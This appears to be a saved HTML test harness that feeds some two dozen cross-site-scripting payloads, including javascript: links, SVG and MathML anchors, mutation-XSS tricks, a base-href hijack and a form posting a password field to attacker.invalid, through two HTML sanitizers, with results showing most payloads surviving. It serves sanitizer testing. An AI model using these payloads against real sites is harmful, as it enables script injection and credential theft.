@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>DONE a-js,a-js-entity,svg-a-js,svg-xlink-js,formaction-js,form-action-js</title></head><body>
+<div id="sink"><div class="np-read-body" data-width="68"><a href="javascript:mark('a-js')">click a-js</a>
+<!--a-js-entity--><a href="javascript:mark('a-js-entity')">click a-js-entity</a>
+<!--svg-a-js--><svg><a href="javascript:mark('svg-a-js')"><text>svg-a</text></a></svg>
+<!--svg-xlink-js--><svg><a xlink:href="javascript:mark('svg-xlink-js')"><text>xlink</text></a></svg>
+<!--math-a-js--><math><a href="javascript:mark('math-a-js')">math-a</a></math>
+<!--formaction-js--><form><button formaction="javascript:mark('formaction-js')">go</button></form>
+<!--form-action-js--><form action="javascript:mark('form-action-js')"><input type="submit" value="s"></form>
+<!--object-js--><object data="javascript:mark('object-js')">obj</object>
+<!--embed-js--><embed src="javascript:mark('embed-js')">
+<!--img-src-js--><img src="javascript:mark('img-src-js')" referrerpolicy="no-referrer" style="max-width: 100%; height: auto; position: static">
+<!--base-href--><base href="https://attacker.invalid/base/">
+<!--style-block--><style>.mpred{position:fixed;inset:0;background:red;z-index:9999}</style>
+<!--form-ext--><form action="https://attacker.invalid/collect"><input name="pw" value="seed"></form>
+<!--link-css--><link rel="stylesheet" href="https://attacker.invalid/x.css">
+<!--iframe-srcdoc-->sd<p></p>"&gt;
+<!--noscript-mxss--><noscript><p title="&lt;/noscript&gt;&lt;img src=x /onerror=mark('noscript-mxss')&gt;">
+<!--img-onerror--><img src="x" referrerpolicy="no-referrer" style="max-width: 100%; height: auto; position: static">
+<!--svg-onload--><svg></svg>
+<!--svg-nospace-on-->
+<!--script-inline-->
+<!--script-unclosed--></p></noscript></div></div>
+<script src="host.js"></script>
+<script src="markdown.js"></script>
+<script>
+window.__marks = [];
+function mark(s){ window.__marks.push(s); document.title = 'XSS:' + window.__marks.join(','); }
+const R = [];
+const out = (n,v) => R.push(n + ' :: ' + v);
+
+/* Payload battery — each is a candidate <div id="js_content"> body child. */
+const P = {
+ 'a-js':            '<a href="javascript:mark(\'a-js\')">click a-js</a>',
+ 'a-js-entity':     '<a href="&#106;avascript:mark(\'a-js-entity\')">click a-js-entity</a>',
+ 'svg-a-js':        '<svg><a href="javascript:mark(\'svg-a-js\')"><text>svg-a</text></a></svg>',
+ 'svg-xlink-js':    '<svg><a xlink:href="javascript:mark(\'svg-xlink-js\')"><text>xlink</text></a></svg>',
+ 'math-a-js':       '<math><a href="javascript:mark(\'math-a-js\')">math-a</a></math>',
+ 'formaction-js':   '<form><button formaction="javascript:mark(\'formaction-js\')">go</button></form>',
+ 'form-action-js':  '<form action="javascript:mark(\'form-action-js\')"><input type="submit" value="s"></form>',
+ 'object-js':       '<object data="javascript:mark(\'object-js\')">obj</object>',
+ 'embed-js':        '<embed src="javascript:mark(\'embed-js\')">',
+ 'img-src-js':      '<img src="javascript:mark(\'img-src-js\')">',
+ 'base-href':       '<base href="https://attacker.invalid/base/">',
+ 'style-block':     '<style>.mpred{position:fixed;inset:0;background:red;z-index:9999}</style>',
+ 'form-ext':        '<form action="https://attacker.invalid/collect"><input name="pw" value="seed"></form>',
+ 'link-css':        '<link rel="stylesheet" href="https://attacker.invalid/x.css">',
+ 'iframe-srcdoc':   '<iframe srcdoc="<p>sd</p>"></iframe>',
+ 'noscript-mxss':   '<noscript><p title="</noscript><img src=x /onerror=mark(\'noscript-mxss\')>"></noscript>',
+ 'img-onerror':     '<img src=x onerror="mark(\'img-onerror\')">',
+ 'svg-onload':      '<svg onload="mark(\'svg-onload\')"></svg>',
+ 'svg-nospace-on':  '<svg x="1"onload="mark(\'svg-nospace-on\')"></svg>',
+ 'script-inline':   '<scr'+'ipt>mark(\'script-inline\')</scr'+'ipt>',
+ 'script-unclosed': '<scr'+'ipt>mark(\'script-unclosed\')',
+ 'a-data':          '<a href="data:text/html,<title>A-DATA</title>">click a-data</a>',
+ 'video-ext':       '<video src="https://attacker.invalid/v.mp4" autoplay></video>',
+ 'input-isindex':   '<isindex action="javascript:mark(\'isindex\')">',
+ /* review 3456 F1: comments also close on `<!-->`/`--!>` in Chrome, so a
+  * smuggled <img onerror> escapes a verbatim comment in single-pass output */
+ 'comment-bang-close':   '<!-- --!><img src=x onerror="mark(\'comment-bang-close\')"> -->',
+ 'comment-open-close':   '<!--><img src=x onerror="mark(\'comment-open-close\')">-->',
+ 'comment-dash-close':   '<!---><img src=x onerror="mark(\'comment-dash-close\')"><!-->',
+};
+
+/* Faithful fetchMpArticle extraction path: mpContent slices js_content,
+   sanitizeMpHtml is the host regex pass (verbatim from index.js). */
+const inner = Object.keys(P).map(k => '<!--' + k + '-->' + P[k]).join('\n');
+const fakePage = '<html><body><div id="js_content" class="rich_media_content " style="visibility:hidden">' + inner + '</div></body></html>';
+const content = mpContent(fakePage);
+out('mpContent', content === null ? 'NULL' : 'sliced ' + content.length + ' chars');
+const hostOut = sanitizeMpHtml(content);
+out('host-out', hostOut);
+/* Per-payload host survival: look for a distinctive signature of each. */
+const sig = {
+ 'a-js':'mark(\'a-js\')', 'a-js-entity':'&#106;avascript', 'svg-a-js':'svg-a-js',
+ 'svg-xlink-js':'svg-xlink-js', 'math-a-js':'math-a-js', 'formaction-js':'formaction-js',
+ 'form-action-js':'form-action-js', 'object-js':'object-js', 'embed-js':'embed-js',
+ 'img-src-js':'img-src-js', 'base-href':'<base', 'style-block':'<style>', 'form-ext':'attacker.invalid/collect',
+ 'link-css':'<link', 'iframe-srcdoc':'srcdoc', 'noscript-mxss':'noscript-mxss',
+ 'img-onerror':'img-onerror', 'svg-onload':'svg-onload', 'svg-nospace-on':'svg-nospace-on',
+ 'script-inline':'script-inline', 'script-unclosed':'script-unclosed', 'a-data':'A-DATA',
+ 'video-ext':'attacker.invalid/v.mp4', 'input-isindex':'isindex',
+};
+for (const k of Object.keys(P)) out('host[' + k + ']', hostOut.includes(sig[k]) ? 'SURVIVES' : 'removed');
+
+/* Client layer (verbatim sanitizeRichHtml) then the panel's exact sink:
+   read.innerHTML = `<div class="np-read-body" ...>${sanitizeRichHtml(draft)}</div>` */
+let rich = '';
+try { rich = sanitizeRichHtml(hostOut, { dark: false }); }
+catch (e) { out('client-throw', e.name + ': ' + e.message); }
+out('rich-out', rich);
+const cSurv = (k, s) => out('client[' + k + ']', rich.includes(s) ? 'SURVIVES' : 'removed');
+for (const k of Object.keys(sig)) cSurv(k, sig[k]);
+
+sink.innerHTML = '<div class="np-read-body" data-width="68">' + rich + '</div>';
+
+setTimeout(() => {
+  out('marks-after-insert', window.__marks.join(',') || 'none');
+  /* Real user-style activation of whatever the pipeline kept. */
+  for (const a of sink.querySelectorAll('a')) {
+    const h = a.getAttribute('href') || a.getAttribute('xlink:href') || '';
+    if (/^javascript:|^&#/.test(h)) { try { a.click(); } catch(e){} }
+  }
+  for (const a of sink.querySelectorAll('svg a')) { try { a.dispatchEvent(new MouseEvent('click', { bubbles: true })); } catch(e){} }
+  for (const b of sink.querySelectorAll('button, input[type="submit"]')) { try { b.click(); } catch(e){} }
+  out('embed-present', !!sink.querySelector('embed'));
+  out('object-present', !!sink.querySelector('object'));
+  out('style-present', !!sink.querySelector('style'));
+  out('link-present', !!sink.querySelector('link'));
+  out('base-href-effective', (sink.querySelector('base') || {href:'none'}).href);
+  setTimeout(() => {
+    out('marks-final', window.__marks.join(',') || 'none');
+    document.title = 'DONE ' + (window.__marks.join(',') || 'nomarks');
+    const pre = document.createElement('pre'); pre.id = 'results';
+    pre.textContent = R.join('\n'); document.body.appendChild(pre);
+  }, 600);
+}, 600);
+</script>
+<pre id="results">mpContent :: sliced 1825 chars
+host-out :: &lt;!--a-js--&gt;&lt;a href="javascript:mark('a-js')"&gt;click a-js&lt;/a&gt;
+&lt;!--a-js-entity--&gt;&lt;a href="&amp;#106;avascript:mark('a-js-entity')"&gt;click a-js-entity&lt;/a&gt;
+&lt;!--svg-a-js--&gt;&lt;svg&gt;&lt;a href="javascript:mark('svg-a-js')"&gt;&lt;text&gt;svg-a&lt;/text&gt;&lt;/a&gt;&lt;/svg&gt;
+&lt;!--svg-xlink-js--&gt;&lt;svg&gt;&lt;a xlink:href="javascript:mark('svg-xlink-js')"&gt;&lt;text&gt;xlink&lt;/text&gt;&lt;/a&gt;&lt;/svg&gt;
+&lt;!--math-a-js--&gt;&lt;math&gt;&lt;a href="javascript:mark('math-a-js')"&gt;math-a&lt;/a&gt;&lt;/math&gt;
+&lt;!--formaction-js--&gt;&lt;form&gt;&lt;button formaction="javascript:mark('formaction-js')"&gt;go&lt;/button&gt;&lt;/form&gt;
+&lt;!--form-action-js--&gt;&lt;form action="javascript:mark('form-action-js')"&gt;&lt;input type="submit" value="s"&gt;&lt;/form&gt;
+&lt;!--object-js--&gt;&lt;object data="javascript:mark('object-js')"&gt;obj&lt;/object&gt;
+&lt;!--embed-js--&gt;&lt;embed src="javascript:mark('embed-js')"&gt;
+&lt;!--img-src-js--&gt;&lt;img src="javascript:mark('img-src-js')"&gt;
+&lt;!--base-href--&gt;&lt;base href="https://attacker.invalid/base/"&gt;
+&lt;!--style-block--&gt;&lt;style&gt;.mpred{position:fixed;inset:0;background:red;z-index:9999}&lt;/style&gt;
+&lt;!--form-ext--&gt;&lt;form action="https://attacker.invalid/collect"&gt;&lt;input name="pw" value="seed"&gt;&lt;/form&gt;
+&lt;!--link-css--&gt;&lt;link rel="stylesheet" href="https://attacker.invalid/x.css"&gt;
+&lt;!--iframe-srcdoc--&gt;sd&lt;/p&gt;"&gt;&lt;/iframe&gt;
+&lt;!--noscript-mxss--&gt;&lt;noscript&gt;&lt;p title="&lt;/noscript&gt;&lt;img src=x /onerror=mark('noscript-mxss')&gt;"&gt;&lt;/noscript&gt;
+&lt;!--img-onerror--&gt;&lt;img src=x&gt;
+&lt;!--svg-onload--&gt;&lt;svg&gt;&lt;/svg&gt;
+&lt;!--svg-nospace-on--&gt;&lt;svg x="1"onload="mark('svg-nospace-on')"&gt;&lt;/svg&gt;
+&lt;!--script-inline--&gt;
+&lt;!--script-unclosed--&gt;&lt;script&gt;mark('script-unclosed')
+&lt;!--a-data--&gt;&lt;a href="data:text/html,&lt;title&gt;A-DATA&lt;/title&gt;"&gt;click a-data&lt;/a&gt;
+&lt;!--video-ext--&gt;&lt;video src="https://attacker.invalid/v.mp4" autoplay&gt;&lt;/video&gt;
+&lt;!--input-isindex--&gt;&lt;isindex action="javascript:mark('isindex')"&gt;
+host[a-js] :: SURVIVES
+host[a-js-entity] :: SURVIVES
+host[svg-a-js] :: SURVIVES
+host[svg-xlink-js] :: SURVIVES
+host[math-a-js] :: SURVIVES
+host[formaction-js] :: SURVIVES
+host[form-action-js] :: SURVIVES
+host[object-js] :: SURVIVES
+host[embed-js] :: SURVIVES
+host[img-src-js] :: SURVIVES
+host[base-href] :: SURVIVES
+host[style-block] :: SURVIVES
+host[form-ext] :: SURVIVES
+host[link-css] :: SURVIVES
+host[iframe-srcdoc] :: SURVIVES
+host[noscript-mxss] :: SURVIVES
+host[img-onerror] :: SURVIVES
+host[svg-onload] :: SURVIVES
+host[svg-nospace-on] :: SURVIVES
+host[script-inline] :: SURVIVES
+host[script-unclosed] :: SURVIVES
+host[a-data] :: SURVIVES
+host[video-ext] :: SURVIVES
+host[input-isindex] :: SURVIVES
+rich-out :: &lt;a href="javascript:mark('a-js')"&gt;click a-js&lt;/a&gt;
+&lt;!--a-js-entity--&gt;&lt;a href="javascript:mark('a-js-entity')"&gt;click a-js-entity&lt;/a&gt;
+&lt;!--svg-a-js--&gt;&lt;svg&gt;&lt;a href="javascript:mark('svg-a-js')"&gt;&lt;text&gt;svg-a&lt;/text&gt;&lt;/a&gt;&lt;/svg&gt;
+&lt;!--svg-xlink-js--&gt;&lt;svg&gt;&lt;a xlink:href="javascript:mark('svg-xlink-js')"&gt;&lt;text&gt;xlink&lt;/text&gt;&lt;/a&gt;&lt;/svg&gt;
+&lt;!--math-a-js--&gt;&lt;math&gt;&lt;a href="javascript:mark('math-a-js')"&gt;math-a&lt;/a&gt;&lt;/math&gt;
+&lt;!--formaction-js--&gt;&lt;form&gt;&lt;button formaction="javascript:mark('formaction-js')"&gt;go&lt;/button&gt;&lt;/form&gt;
+&lt;!--form-action-js--&gt;&lt;form action="javascript:mark('form-action-js')"&gt;&lt;input type="submit" value="s"&gt;&lt;/form&gt;
+&lt;!--object-js--&gt;&lt;object data="javascript:mark('object-js')"&gt;obj&lt;/object&gt;
+&lt;!--embed-js--&gt;&lt;embed src="javascript:mark('embed-js')"&gt;
+&lt;!--img-src-js--&gt;&lt;img src="javascript:mark('img-src-js')" referrerpolicy="no-referrer" style="max-width: 100%; height: auto; position: static"&gt;
+&lt;!--base-href--&gt;&lt;base href="https://attacker.invalid/base/"&gt;
+&lt;!--style-block--&gt;&lt;style&gt;.mpred{position:fixed;inset:0;background:red;z-index:9999}&lt;/style&gt;
+&lt;!--form-ext--&gt;&lt;form action="https://attacker.invalid/collect"&gt;&lt;input name="pw" value="seed"&gt;&lt;/form&gt;
+&lt;!--link-css--&gt;&lt;link rel="stylesheet" href="https://attacker.invalid/x.css"&gt;
+&lt;!--iframe-srcdoc--&gt;sd&lt;p&gt;&lt;/p&gt;"&amp;gt;
+&lt;!--noscript-mxss--&gt;&lt;noscript&gt;&lt;p title="&amp;lt;/noscript&amp;gt;&amp;lt;img src=x /onerror=mark('noscript-mxss')&amp;gt;"&gt;
+&lt;!--img-onerror--&gt;&lt;img src="x" referrerpolicy="no-referrer" style="max-width: 100%; height: auto; position: static"&gt;
+&lt;!--svg-onload--&gt;&lt;svg&gt;&lt;/svg&gt;
+&lt;!--svg-nospace-on--&gt;
+&lt;!--script-inline--&gt;
+&lt;!--script-unclosed--&gt;&lt;/p&gt;&lt;/noscript&gt;
+client[a-js] :: SURVIVES
+client[a-js-entity] :: removed
+client[svg-a-js] :: SURVIVES
+client[svg-xlink-js] :: SURVIVES
+client[math-a-js] :: SURVIVES
+client[formaction-js] :: SURVIVES
+client[form-action-js] :: SURVIVES
+client[object-js] :: SURVIVES
+client[embed-js] :: SURVIVES
+client[img-src-js] :: SURVIVES
+client[base-href] :: SURVIVES
+client[style-block] :: SURVIVES
+client[form-ext] :: SURVIVES
+client[link-css] :: SURVIVES
+client[iframe-srcdoc] :: SURVIVES
+client[noscript-mxss] :: SURVIVES
+client[img-onerror] :: SURVIVES
+client[svg-onload] :: SURVIVES
+client[svg-nospace-on] :: SURVIVES
+client[script-inline] :: SURVIVES
+client[script-unclosed] :: SURVIVES
+client[a-data] :: removed
+client[video-ext] :: removed
+client[input-isindex] :: removed
+marks-after-insert :: none
+embed-present :: true
+object-present :: true
+style-present :: true
+link-present :: true
+base-href-effective :: https://attacker.invalid/base/
+marks-final :: a-js,a-js-entity,svg-a-js,svg-xlink-js,formaction-js,form-action-js</pre></body></html>
